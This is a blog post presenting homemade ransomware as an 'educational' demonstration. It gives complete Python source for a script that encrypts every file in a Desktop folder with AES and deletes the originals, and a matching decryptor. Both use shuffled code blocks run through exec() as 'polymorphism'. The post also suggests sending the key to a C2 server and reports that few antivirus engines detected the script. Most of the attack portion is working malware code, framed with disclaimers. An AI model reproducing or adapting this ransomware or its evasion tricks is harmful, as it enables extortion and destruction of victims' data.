---
title: "The Dangers of Homemade Ransomware and AI"
date: 2023-01-05 12:15:44
categories: [ransomware, cryptography]
tags: [ransomware, cryptography]
---

### Introduction 

With the advancement of technology, the digital world has become a fertile ground for numerous cyber threats. Among them, ransomware stands out for its devastating ability to hijack personal and corporate data, demanding ransoms for its release. In this article, we will explore how homemade ransomware can be created and the dangers they pose, even against systems equipped with the latest antivirus software. We will use practical examples of code that can transform a simple Python script into a powerful file encryption tool. We emphasize that this article is for educational purposes and aims to raise awareness about the capabilities and risks of modern technologies.

### Homemade Ransomware: A Real Threat 

Ransomware is a type of malware that encrypts the victim's files and demands a ransom for data recovery. While many think that creating ransomware is something exclusive to sophisticated hackers, the reality is that anyone with basic programming knowledge can create homemade ransomware. This ease of creation makes this threat even more dangerous.

### Practical Example: File Encryption 
To illustrate how homemade ransomware can be created, we will use an example of Python code. The following code is designed to encrypt all files in a specific folder called `cow`, located on the user's desktop.Encryption Code (`encrypt.py`):

```python
import os
import random
import shutil
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes, padding
from base64 import urlsafe_b64encode

def generate_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())
    return key

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()

    iv = secrets.token_bytes(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(file_path + '.enc', 'wb') as f:
        f.write(iv + encrypted_data)

    os.remove(file_path)

def encrypt_folder(folder_path):
    password = secrets.token_urlsafe(16)  # Gera uma senha aleatória segura
    salt = secrets.token_bytes(16)
    key = generate_key(password, salt)

    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

    # Salva o salt e a senha em um arquivo na pasta criptografada
    with open(os.path.join(folder_path, 'salt_and_password.txt'), 'w') as f:
        f.write(f'Salt: {urlsafe_b64encode(salt).decode()}\n')
        f.write(f'Senha: {password}\n')

def generate_polymorphic_code():
    blocks = [
        "import os\nimport shutil\nimport secrets\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\nfrom cryptography.hazmat.primitives import hashes, padding\nfrom base64 import urlsafe_b64encode",
        "desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')",
        "source_folder = os.path.join(desktop_path, 'cow')",
        "def generate_key(password, salt):\n    kdf = PBKDF2HMAC(\n        algorithm=hashes.SHA256(),\n        length=32,\n        salt=salt,\n        iterations=100000,\n        backend=default_backend()\n    )\n    key = kdf.derive(password.encode())\n    return key",
        "def encrypt_file(file_path, key):\n    with open(file_path, 'rb') as f:\n        data = f.read()\n    iv = secrets.token_bytes(16)\n    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())\n    encryptor = cipher.encryptor()\n    padder = padding.PKCS7(algorithms.AES.block_size).padder()\n    padded_data = padder.update(data) + padder.finalize()\n    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()\n    with open(file_path + '.enc', 'wb') as f:\n        f.write(iv + encrypted_data)\n    os.remove(file_path)",
        "def encrypt_folder(folder_path):\n    password = secrets.token_urlsafe(16)\n    salt = secrets.token_bytes(16)\n    key = generate_key(password, salt)\n    for root, _, files in os.walk(folder_path):\n        for file in files:\n            file_path = os.path.join(root, file)\n            encrypt_file(file_path, key)\n    with open(os.path.join(folder_path, 'salt_and_password.txt'), 'w') as f:\n        f.write(f'Salt: {urlsafe_b64encode(salt).decode()}\\n')\n        f.write(f'Senha: {password}\\n')",
    ]
    random.shuffle(blocks)
    return "\n\n".join(blocks)

def execute_polymorphic_code(code):
    local_vars = {}
    exec(code, globals(), local_vars)
    return local_vars

def main():
    polymorphic_code = generate_polymorphic_code()
    print("Generated Polymorphic Code:")
    print(polymorphic_code)
    
    action_code = f"""
{polymorphic_code}

if os.path.exists(source_folder):
    encrypt_folder(source_folder)
    print(f'Arquivos na pasta {{source_folder}} criptografados com sucesso.')
else:
    print(f'A pasta {{source_folder}} não existe.')
"""
    local_vars = execute_polymorphic_code(action_code)

if __name__ == "__main__":
    main()

```

### File Decryption 
To decrypt the files, a corresponding decryption code is needed. Here is an example of code to decrypt the files encrypted in the `cow` folder.Decryption Code (`decrypt.py`):

```python
import os
import random
import shutil
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes, padding
from base64 import urlsafe_b64decode


def generate_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())
    return key


def decrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        iv = f.read(16)
        encrypted_data = f.read()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

    original_file_path = file_path[:-4]
    with open(original_file_path, 'wb') as f:
        f.write(data)

    os.remove(file_path)


def decrypt_folder(folder_path, password):
    salt_path = os.path.join(folder_path, 'salt_and_password.txt')
    if not os.path.exists(salt_path):
        print("Salt file not found!")
        return

    with open(salt_path, 'r') as f:
        lines = f.readlines()
        salt = urlsafe_b64decode(lines[0].split(': ')[1].strip())

    key = generate_key(password, salt)

    for root, _, files in os.walk(folder_path):
        for file in files:
            if file != 'salt_and_password.txt':
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key)


def generate_polymorphic_code():
    blocks = [
        "import os\nimport shutil\nimport secrets\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\nfrom cryptography.hazmat.primitives import hashes, padding\nfrom base64 import urlsafe_b64decode",
        "desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')",
        "source_folder = os.path.join(desktop_path, 'cow')",
        "def generate_key(password, salt):\n    kdf = PBKDF2HMAC(\n        algorithm=hashes.SHA256(),\n        length=32,\n        salt=salt,\n        iterations=100000,\n        backend=default_backend()\n    )\n    key = kdf.derive(password.encode())\n    return key",
        "def decrypt_file(file_path, key):\n    with open(file_path, 'rb') as f:\n        iv = f.read(16)\n        encrypted_data = f.read()\n    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())\n    decryptor = cipher.decryptor()\n    decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()\n    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()\n    data = unpadder.update(decrypted_padded_data) + unpadder.finalize()\n    original_file_path = file_path[:-4]\n    with open(original_file_path, 'wb') as f:\n        f.write(data)\n    os.remove(file_path)",
        "def decrypt_folder(folder_path, password):\n    salt_path = os.path.join(folder_path, 'salt_and_password.txt')\n    if not os.path.exists(salt_path):\n        print('Salt file not found!')\n        return\n    with open(salt_path, 'r') as f:\n        lines = f.readlines()\n        salt = urlsafe_b64decode(lines[0].split(': ')[1].strip())\n    key = generate_key(password, salt)\n    for root, _, files in os.walk(folder_path):\n        for file in files:\n            if file != 'salt_and_password.txt':\n                file_path = os.path.join(root, file)\n                decrypt_file(file_path, key)",
    ]
    random.shuffle(blocks)
    return "\n\n".join(blocks)


def execute_polymorphic_code(code):
    local_vars = {}
    exec(code, globals(), local_vars)
    return local_vars


def main():
    polymorphic_code = generate_polymorphic_code()
    print("Generated Polymorphic Code:")
    print(polymorphic_code)

    password = input("Digite a senha para descriptografia: ")
    action_code = f"""
{polymorphic_code}

if os.path.exists(source_folder):
    decrypt_folder(source_folder, '{password}')
    print(f'Arquivos na pasta {{source_folder}} descriptografados com sucesso.')
else:
    print(f'A pasta {{source_folder}} não existe.')
"""
    local_vars = execute_polymorphic_code(action_code)


if __name__ == "__main__":
    main()


```

### Lethality Against Next-Generation Antivirus 
In this example, polymorphism and AES-256 were used, and the password file was saved in the `cow` folder. However, the password could be a string sent to a C2 server or to the machine of a threat actor.
Even with next-generation antivirus installed, these scripts can be lethal. File encryption is a legitimate operation used by many security software to protect data. However, when used maliciously, it becomes a powerful tool for hijacking data.

Traditional antivirus may not immediately detect these scripts because:
 
1. **File encryption is not inherently malicious.**  Many legitimate programs, such as backup software, perform encryption operations.
 
2. **Obfuscation and polymorphism hinder detection.**  Polymorphic scripts change their appearance every time they are executed, making it difficult for antivirus to identify malicious patterns.
 
3. **The scripts are customized.**  Unlike widely disseminated malware, homemade scripts are unique and not in virus signature databases.

### Antivirus Detection 
| Antivirus | Detection Name | Antivirus | Detection Name | 
| --- | --- | --- | --- | 
| Malwarebytes | Ransom.FileCryptor.Python | MaxSecure | Win.MxResIcn.Heur.Gen | 
| Sangfor Engine Zero | Trojan.Win32.Save.a | SecureAge | Malicious | 

None of the other antivirus software detected the script.

### Conclusion  
This article illustrates the dangers of homemade ransomware and how technology can be used to create encryption tools that, when misused, can have devastating consequences. The example of the `cow` folder shows how a simple script can encrypt data and demand a ransom for recovery. It is essential to remember that this content is for educational purposes and aims to raise awareness about the capabilities and risks of modern technologies.
In future articles, we will discuss how to mitigate these threats and protect your data against ransomware and other forms of malware.

### Legal Notice 

The creation and use of ransomware are illegal and unethical. This article is intended exclusively for educational purposes and to promote cybersecurity awareness. We do not encourage or endorse the malicious use of the techniques described here.